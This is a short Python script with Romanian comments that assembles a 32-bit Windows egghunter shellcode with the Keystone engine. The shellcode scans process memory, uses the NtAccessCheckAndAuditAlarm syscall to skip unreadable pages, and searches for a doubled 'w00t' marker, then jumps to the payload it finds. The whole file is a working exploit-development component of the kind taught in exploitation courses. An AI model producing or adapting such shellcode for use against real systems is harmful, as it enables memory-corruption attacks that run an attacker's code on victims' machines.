from keystone import *
import utils

CODE = (
    # Folosim registrul edx ca un contor de pagini de memorie
    " loop_inc_page: "
        # Mergem la ultima adresa din pagina de memorie
        " or dx, 0x0fff ;"
    " loop_inc_one: "
        # Incrementeaza contorul de memorie cu 1
        " inc edx ;"
    " loop_check: "
        # Salvam edx care contine adresa pe care vrem sa o verificam
        " push edx ;"
        # Punem syscall-ul negativ in registru
        " mov eax, 0xfffffe3a ;"
        # Calculam negativul lui EAX NtAccessCheckAndAuditAlarm
        " neg eax ;"
        # Facem syscall-ul
        " int 0x2e ;"
        # Verificam pentru erori de acces de memorie, 0xc0000005
        # (ACCESS_VIOLATION)
        " cmp al,05 ;"
        # Dam restore registrului edx-ului pentru a verifica egg-ul
        " pop edx ;"
    " loop_check_valid: "
        # Daca a fost intalnita o incalcare de acces, trecem la urmatoarea pagina
        " je loop_inc_page ;"
        " is_egg: "
        # Incarcam "egg-ul" (w00t in acest exemplu) in registrul eax
        " mov eax, 0x74303077 ;"
        # Initializam pointerul cu adresa curenta verificata
        " mov edi, edx ;"
        # Comparam eax cu doubleword-ul de la edi si setam flag-urile
        " scasd ;"
        # Nu am gasit o potrivire, crestem contorul de memorie cu 1
        " jnz loop_inc_one ;"
        # Prima parte a "egg-ului" a fost detectata, verificam partea a doua
        " scasd ;"
        # Nu am gasit o potrivire completa, doar jumatate de "egg"
        " jnz loop_inc_one ;"
    " matched: "
        # Registrul edi pointeaza la primul byte din buffer-ul nostru, putem face salt acolo
        " jmp edi ;"
)

# Initializam motorul in modul 32 biti
ks = Ks(KS_ARCH_X86, KS_MODE_32)
encoding, count = ks.asm(CODE)

egghunter = bytes(encoding)

utils.display_shellcode(egghunter, "egghunter")